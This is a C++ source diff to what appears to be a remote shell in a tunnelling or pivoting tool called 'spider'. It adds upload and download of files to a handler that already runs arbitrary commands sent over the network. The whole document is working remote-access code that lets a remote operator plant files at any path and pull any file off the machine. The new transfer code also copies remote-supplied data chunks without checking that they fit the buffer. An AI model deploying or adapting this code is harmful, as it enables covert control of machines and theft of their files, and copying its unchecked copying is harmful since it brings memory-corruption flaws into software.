@@ -801,6 +801,7 @@ namespace spider
         int32_t ret = 0;
         int32_t rec = 0;
         int32_t sen = 0;
+        int32_t len = 0;
 
         char *buffer = (char *)calloc(NODE_BUFFER_SIZE,
                                       sizeof(char));
@@ -818,6 +819,21 @@ namespace spider
         std::string result;
         int32_t result_size = 0;
         BOOL exit_flag = false;
+
+        std::string upload_file_name = "";
+        std::string upload_file_path = "";
+        uint64_t upload_file_size;
+        uint64_t recv_upload_file_data_size;
+        uint64_t upload_file_remaining_size;
+        char *upload_file_data = NULL;
+        struct upload_download_data *upload_download_data;
+        BOOL upload_file_flag = false;
+
+        std::string download_file_name = "";
+        std::string download_file_path = "";
+        uint64_t download_file_size;
+        uint64_t download_file_remaining_size;
+        uint64_t read_bytes;
 
 
         while(1)
@@ -839,25 +855,73 @@ namespace spider
                 {
                     next_recv_message_id++;
                     result = "";
-                    input = buffer;
 
-                    tokens = split_input(input);
-                    if(tokens.empty())
+                    upload_download_data = (struct upload_download_data *)buffer;
+                    ret = strncmp(upload_download_data->command,
+                                  "upload",
+                                  sizeof("upload"));
+                    if(ret == 0)
                     {
+                        if(upload_file_flag == false)
+                        {
+                            upload_file_flag = true;
+                            upload_file_path = upload_download_data->file_path;
+                            upload_file_path += "\\";
+                            upload_file_name = upload_download_data->file_name;
+                            upload_file_name = upload_file_path + upload_file_name;
+                            upload_file_size = upload_download_data->file_size;
+                            upload_file_data = (char *)calloc(upload_file_size,
+                                                              sizeof(char));
+                            std::memcpy(upload_file_data,
+                                        upload_download_data->data,
+                                        upload_download_data->data_size);
+
+                            recv_upload_file_data_size = upload_download_data->data_size;
+                            upload_file_remaining_size = upload_file_size - recv_upload_file_data_size;
+                            if(upload_file_remaining_size > 0)
+                            {
+                                continue;
+                            }
+                        }else
+                        {
+                            std::memcpy(upload_file_data + recv_upload_file_data_size,
+                                        upload_download_data->data,
+                                        upload_download_data->data_size);
+
+                            recv_upload_file_data_size += upload_download_data->data_size;
+                            upload_file_remaining_size -= upload_download_data->data_size;
+                            if(upload_file_remaining_size > 0)
+                            {
+                                continue;
+                            }
+                        }
+
+                        std::ofstream output_file(upload_file_name.c_str(),
+                                                  std::ios::binary);
+
+                        output_file.write(upload_file_data,
+                                          upload_file_size);
+
+                        output_file.close();
+
                         std::memset(buffer,
                                     0,
                                     buffer_max_length);
 
+                        result = "[+] upload file: ";
+                        result += upload_file_name;
+                        result += prompt;
+
                         std::memcpy(buffer,
-                                    prompt.c_str(),
-                                    prompt_size);
+                                    result.c_str(),
+                                    result.size());
 
 #ifdef DEBUGPRINT
                         std::printf("[+] [client <- server] send_message message_id:%u\n",
                                     send_message_id);
 #endif
                         sen = send_message(buffer,
-                                           prompt_size,
+                                           result.size(),
                                            forwarder_tv_sec,
                                            forwarder_tv_usec);
                         if(sen > 0)
@@ -865,107 +929,20 @@ namespace spider
                             send_message_id++;
                         }
 
+                        upload_file_flag = false;
+                        upload_file_name = "";
+                        upload_file_path = "";
+                        upload_file_size = 0;
+                        recv_upload_file_data_size = 0;
+                        upload_file_remaining_size = 0;
+                        free(upload_file_data);
+                        upload_file_data = NULL;
+
                         continue;
-                    }
-
-                    if(tokens[0] == "exit")
-                    {
-                        exit_flag = true;
-                        break;
-                    }else if(tokens[0] == "cd")
-                    {
-                        if(tokens.size() > 1)
-                        {
-                            ret = SetCurrentDirectory(tokens[1].c_str());
-                            if(ret == 0)
-                            {
-#ifdef DEBUGPRINT
-                                std::printf("[-] change directory error: %s, %d\n",
-                                            tokens[1].c_str(),
-                                            GetLastError());
-#endif
-                                result = "[-] change directory error\n";
-                            }else{
-                                std::memset(buffer,
-                                            0,
-                                            buffer_max_length);
-
-                                std::memcpy(buffer,
-                                            prompt.c_str(),
-                                            prompt_size);
-
-#ifdef DEBUGPRINT
-                                std::printf("[+] [client <- server] send_message message_id:%u\n",
-                                            send_message_id);
-#endif
-                                sen = send_message(buffer,
-                                                   prompt_size,
-                                                   forwarder_tv_sec,
-                                                   forwarder_tv_usec);
-                                if(sen > 0)
-                                {
-                                    send_message_id++;
-                                }
-
-                                continue;
-                            }
-                        }else
-                        {
-                            result = execute_command(input);
-                        }
                     }else
                     {
-                        result = execute_command(input);
-                    }
 
-                    std::memset(buffer,
-                                0,
-                                buffer_max_length);
-
-                    result_size = result.size();
-                    if(result_size > SOCKS5_MESSAGE_DATA_SIZE - 0x10 - prompt_size)
-                    {
-                        result_size = SOCKS5_MESSAGE_DATA_SIZE - 0x10 - prompt_size;
-                    }
-
-                    std::memcpy(buffer,
-                                result.c_str(),
-                                result_size);
-
-                    std::memcpy(buffer+result_size,
-                                prompt.c_str(),
-                                prompt_size);
-
-                    result_size += prompt_size;
-
-#ifdef DEBUGPRINT
-                    std::printf("[+] [client <- server] send_message message_id:%u\n",
-                                send_message_id);
-#endif
-                    sen = send_message(buffer,
-                                       result_size,
-                                       forwarder_tv_sec,
-                                       forwarder_tv_usec);
-                    if(sen > 0)
-                    {
-                        send_message_id++;
-                    }
-                }else
-                {
-                    msg = std::make_pair(rec,
-                                         buffer);
-                    msgs_map.insert({recv_message_id, msg});
-
-                    check_msg_count = msgs_map.count(next_recv_message_id);
-                    while(check_msg_count > 0)
-                    {
-                        msg = msgs_map[next_recv_message_id];
-                        msgs_map.erase(next_recv_message_id);
-
-                        result = "";
-                        buffer = msg.second;
                         input = buffer;
-
                         tokens = split_input(input);
                         if(tokens.empty())
                         {
@@ -990,9 +967,6 @@ namespace spider
                                 send_message_id++;
                             }
 
-                            free(buffer);
-                            next_recv_message_id++;
-                            check_msg_count = msgs_map.count(next_recv_message_id);
                             continue;
                         }
 
@@ -1013,8 +987,7 @@ namespace spider
                                                 GetLastError());
 #endif
                                     result = "[-] change directory error\n";
-                                }else
-                                {
+                                }else{
                                     std::memset(buffer,
                                                 0,
                                                 buffer_max_length);
@@ -1036,15 +1009,122 @@ namespace spider
                                         send_message_id++;
                                     }
 
-                                    free(buffer);
-                                    next_recv_message_id++;
-                                    check_msg_count = msgs_map.count(next_recv_message_id);
                                     continue;
                                 }
+
                             }else
                             {
                                 result = execute_command(input);
                             }
+                        }else if(tokens.size() == 3
+                                 &&tokens[0] == "download")
+                        {
+                            std::ifstream download_file(tokens[1].c_str(),
+                                                        std::ios::binary);
+                            if(!download_file.is_open())
+                            {
+#ifdef DEBUGPRINT
+                                std::printf("[-] file open error\n");
+#endif
+
+                                std::memset(buffer,
+                                            0,
+                                            buffer_max_length);
+
+                                result = "[-] file open error";
+                                result += prompt;
+
+                                std::memcpy(buffer,
+                                            result.c_str(),
+                                            result.size());
+
+#ifdef DEBUGPRINT
+                                std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                            send_message_id);
+#endif
+                                sen = send_message(buffer,
+                                                   result.size(),
+                                                   forwarder_tv_sec,
+                                                   forwarder_tv_usec);
+                                if(sen > 0)
+                                {
+                                    send_message_id++;
+                                }
+                            }else
+                            {
+                                download_file.seekg(0, std::ios::end);
+                                download_file_size = download_file.tellg();
+                                download_file_remaining_size = download_file_size;
+                                download_file.seekg(0, std::ios::beg);
+
+                                std::filesystem::path path(tokens[1].c_str());
+                                download_file_name = path.filename().string();
+                                download_file_path = tokens[2];
+
+                                while(download_file_remaining_size > 0)
+                                {
+                                    std::memset(buffer,
+                                                0,
+                                                buffer_max_length);
+
+                                    upload_download_data = (struct upload_download_data *)buffer;
+
+                                    download_file.read(upload_download_data->data,
+                                                       SHELL_UPLOAD_DOWNLOAD_DATA_SIZE);
+
+                                    read_bytes = download_file.gcount();
+
+                                    std::memcpy(upload_download_data->command,
+                                                "download",
+                                                sizeof("download"));
+
+                                    if(download_file_name.size() > 256)
+                                    {
+                                        std::memcpy(upload_download_data->file_name,
+                                                    download_file_name.c_str(),
+                                                    255);
+                                    }else
+                                    {
+                                        std::memcpy(upload_download_data->file_name,
+                                                    download_file_name.c_str(),
+                                                    download_file_name.size());
+                                    }
+
+                                    if(download_file_path.size() > 256)
+                                    {
+                                        std::memcpy(upload_download_data->file_path,
+                                                    download_file_path.c_str(),
+                                                    255);
+                                    }else
+                                    {
+                                        std::memcpy(upload_download_data->file_path,
+                                                    download_file_path.c_str(),
+                                                    download_file_path.size());
+                                    }
+
+                                    upload_download_data->file_size = download_file_size;
+                                    upload_download_data->data_size = read_bytes;
+
+                                    len = sizeof(struct upload_download_data_header) + read_bytes;
+
+#ifdef DEBUGPRINT
+                                    std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                                send_message_id);
+#endif
+                                    sen = send_message(buffer,
+                                                       len,
+                                                       forwarder_tv_sec,
+                                                       forwarder_tv_usec);
+                                    if(sen > 0)
+                                    {
+                                        send_message_id++;
+                                    }
+
+                                    download_file_remaining_size -= read_bytes;
+                                }
+                            }
+
+                            continue;
                         }else
                         {
                             result = execute_command(input);
@@ -1083,19 +1163,348 @@ namespace spider
                             send_message_id++;
                         }
                     }
+                }else
+                {
+                    msg = std::make_pair(rec,
+                                         buffer);
+                    msgs_map.insert({recv_message_id, msg});
 
-                    if(exit_flag == true)
+                    check_msg_count = msgs_map.count(next_recv_message_id);
+                    while(check_msg_count > 0)
                     {
-                        break;
+                        msg = msgs_map[next_recv_message_id];
+                        msgs_map.erase(next_recv_message_id);
+                        next_recv_message_id++;
+                        check_msg_count = msgs_map.count(next_recv_message_id);
+
+                        result = "";
+                        buffer = msg.second;
+
+                        upload_download_data = (struct upload_download_data *)buffer;
+                        ret = strncmp(upload_download_data->command,
+                                      "upload",
+                                      sizeof("upload"));
+                        if(ret == 0)
+                        {
+                            if(upload_file_flag == false)
+                            {
+                                upload_file_flag = true;
+                                upload_file_path = upload_download_data->file_path;
+                                upload_file_path += "\\";
+                                upload_file_name = upload_download_data->file_name;
+                                upload_file_name = upload_file_path + upload_file_name;
+                                upload_file_size = upload_download_data->file_size;
+                                upload_file_data = (char *)calloc(upload_file_size,
+                                                                  sizeof(char));
+                                std::memcpy(upload_file_data,
+                                            upload_download_data->data,
+                                            upload_download_data->data_size);
+
+                                recv_upload_file_data_size = upload_download_data->data_size;
+                                upload_file_remaining_size = upload_file_size - recv_upload_file_data_size;
+                                if(upload_file_remaining_size > 0)
+                                {
+                                    free(buffer);
+                                    continue;
+                                }
+                            }else
+                            {
+                                std::memcpy(upload_file_data + recv_upload_file_data_size,
+                                            upload_download_data->data,
+                                            upload_download_data->data_size);
+
+                                recv_upload_file_data_size += upload_download_data->data_size;
+                                upload_file_remaining_size -= upload_download_data->data_size;
+                                if(upload_file_remaining_size > 0)
+                                {
+                                    free(buffer);
+                                    continue;
+                                }
+                            }
+
+                            std::ofstream output_file(upload_file_name.c_str(),
+                                                      std::ios::binary);
+
+                            output_file.write(upload_file_data,
+                                              upload_file_size);
+
+                            output_file.close();
+
+                            std::memset(buffer,
+                                        0,
+                                        buffer_max_length);
+
+                            result = "[+] upload file: ";
+                            result += upload_file_name;
+                            result += prompt;
+
+                            std::memcpy(buffer,
+                                        result.c_str(),
+                                        result.size());
+
+#ifdef DEBUGPRINT
+                            std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                        send_message_id);
+#endif
+                            sen = send_message(buffer,
+                                               result.size(),
+                                               forwarder_tv_sec,
+                                               forwarder_tv_usec);
+                            if(sen > 0)
+                            {
+                                send_message_id++;
+                            }
+
+                            upload_file_flag = false;
+                            upload_file_name = "";
+                            upload_file_path = "";
+                            upload_file_size = 0;
+                            recv_upload_file_data_size = 0;
+                            upload_file_remaining_size = 0;
+                            free(upload_file_data);
+                            upload_file_data = NULL;
+
+                            free(buffer);
+                            continue;
+                        }else
+                        {
+                            buffer = msg.second;
+                            input = buffer;
+
+                            tokens = split_input(input);
+                            if(tokens.empty())
+                            {
+                                std::memset(buffer,
+                                            0,
+                                            buffer_max_length);
+
+                                std::memcpy(buffer,
+                                            prompt.c_str(),
+                                            prompt_size);
+
+#ifdef DEBUGPRINT
+                                std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                            send_message_id);
+#endif
+                                sen = send_message(buffer,
+                                                   prompt_size,
+                                                   forwarder_tv_sec,
+                                                   forwarder_tv_usec);
+                                if(sen > 0)
+                                {
+                                    send_message_id++;
+                                }
+
+                                free(buffer);
+                                continue;
+                            }
+                            if(tokens[0] == "exit")
+                            {
+                                exit_flag = true;
+                                break;
+                            }else if(tokens[0] == "cd")
+                            {
+                                if(tokens.size() > 1)
+                                {
+                                    ret = SetCurrentDirectory(tokens[1].c_str());
+                                    if(ret == 0)
+                                    {
+#ifdef DEBUGPRINT
+                                        std::printf("[-] change directory error: %s, %d\n",
+                                                    tokens[1].c_str(),
+                                                    GetLastError());
+#endif
+                                        result = "[-] change directory error\n";
+                                    }else
+                                    {
+                                        std::memset(buffer,
+                                                    0,
+                                                    buffer_max_length);
+
+                                        std::memcpy(buffer,
+                                                    prompt.c_str(),
+                                                    prompt_size);
+
+#ifdef DEBUGPRINT
+                                        std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                                    send_message_id);
+#endif
+                                        sen = send_message(buffer,
+                                                           prompt_size,
+                                                           forwarder_tv_sec,
+                                                           forwarder_tv_usec);
+                                        if(sen > 0)
+                                        {
+                                            send_message_id++;
+                                        }
+
+                                        free(buffer);
+                                        continue;
+                                    }
+                                }else
+                                {
+                                    result = execute_command(input);
+                                }
+                            }else if(tokens.size() == 3
+                                     && tokens[0] == "download")
+                            {
+                                std::ifstream download_file(tokens[1].c_str(),
+                                                            std::ios::binary);
+                                if(!download_file.is_open())
+                                {
+#ifdef DEBUGPRINT
+                                    std::printf("[-] file open error\n");
+#endif
+
+                                    std::memset(buffer,
+                                                0,
+                                                buffer_max_length);
+
+                                    result = "[-] file open error";
+                                    result += prompt;
+
+                                    std::memcpy(buffer,
+                                                result.c_str(),
+                                                result.size());
+
+#ifdef DEBUGPRINT
+                                    std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                                send_message_id);
+#endif
+                                    sen = send_message(buffer,
+                                                       result.size(),
+                                                       forwarder_tv_sec,
+                                                       forwarder_tv_usec);
+                                    if(sen > 0)
+                                    {
+                                        send_message_id++;
+                                    }
+                                }else
+                                {
+                                    download_file.seekg(0, std::ios::end);
+                                    download_file_size = download_file.tellg();
+                                    download_file_remaining_size = download_file_size;
+                                    download_file.seekg(0, std::ios::beg);
+
+                                    std::filesystem::path path(tokens[1].c_str());
+                                    download_file_name = path.filename().string();
+                                    download_file_path = tokens[2];
+
+                                    while(download_file_remaining_size > 0)
+                                    {
+                                        std::memset(buffer,
+                                                    0,
+                                                    buffer_max_length);
+
+                                        upload_download_data = (struct upload_download_data *)buffer;
+
+                                        download_file.read(upload_download_data->data,
+                                                           SHELL_UPLOAD_DOWNLOAD_DATA_SIZE);
+
+                                        read_bytes = download_file.gcount();
+
+                                        std::memcpy(upload_download_data->command,
+                                                    "download",
+                                                    sizeof("download"));
+
+                                        if(download_file_name.size() > 256)
+                                        {
+                                            std::memcpy(upload_download_data->file_name,
+                                                        download_file_name.c_str(),
+                                                        255);
+                                        }else
+                                        {
+                                            std::memcpy(upload_download_data->file_name,
+                                                        download_file_name.c_str(),
+                                                        download_file_name.size());
+                                        }
+
+                                        if(download_file_path.size() > 256)
+                                        {
+                                            std::memcpy(upload_download_data->file_path,
+                                                        download_file_path.c_str(),
+                                                        255);
+                                        }else
+                                        {
+                                            std::memcpy(upload_download_data->file_path,
+                                                        download_file_path.c_str(),
+                                                        download_file_path.size());
+                                        }
+
+                                        upload_download_data->file_size = download_file_size;
+                                        upload_download_data->data_size = read_bytes;
+
+                                        len = sizeof(struct upload_download_data_header) + read_bytes;
+
+#ifdef DEBUGPRINT
+                                        std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                                    send_message_id);
+#endif
+                                        sen = send_message(buffer,
+                                                           len,
+                                                           forwarder_tv_sec,
+                                                           forwarder_tv_usec);
+                                        if(sen > 0)
+                                        {
+                                            send_message_id++;
+                                        }
+
+                                        download_file_remaining_size -= read_bytes;
+                                    }
+                                }
+
+                                free(buffer);
+                                continue;
+                            }else
+                            {
+                                result = execute_command(input);
+                            }
+
+                            std::memset(buffer,
+                                        0,
+                                        buffer_max_length);
+
+                            result_size = result.size();
+                            if(result_size > SOCKS5_MESSAGE_DATA_SIZE - 0x10 - prompt_size)
+                            {
+                                result_size = SOCKS5_MESSAGE_DATA_SIZE - 0x10 - prompt_size;
+                            }
+
+                            std::memcpy(buffer,
+                                        result.c_str(),
+                                        result_size);
+
+                            std::memcpy(buffer+result_size,
+                                        prompt.c_str(),
+                                        prompt_size);
+
+                            result_size += prompt_size;
+
+#ifdef DEBUGPRINT
+                            std::printf("[+] [client <- server] send_message message_id:%u\n",
+                                        send_message_id);
+#endif
+                            sen = send_message(buffer,
+                                               result_size,
+                                               forwarder_tv_sec,
+                                               forwarder_tv_usec);
+                            if(sen > 0)
+                            {
+                                send_message_id++;
+                            }
+                        }
+
+                        if(exit_flag == true)
+                        {
+                            break;
+                        }
+
+                        free(buffer);
                     }
 
-                    free(buffer);
-                    next_recv_message_id++;
-                    check_msg_count = msgs_map.count(next_recv_message_id);
+                    buffer = (char *)calloc(NODE_BUFFER_SIZE,
+                                            sizeof(char));
                 }
-
-                buffer = (char *)calloc(NODE_BUFFER_SIZE,
-                                        sizeof(char));
             }else
             {
                 break;
@@ -1107,6 +1516,11 @@ namespace spider
             msg = it->second;
             free(msg.second);
             it = msgs_map.erase(it);
+        }
+
+        if(upload_file_data != NULL)
+        {
+            free(upload_file_data);
         }
 
         free(buffer);
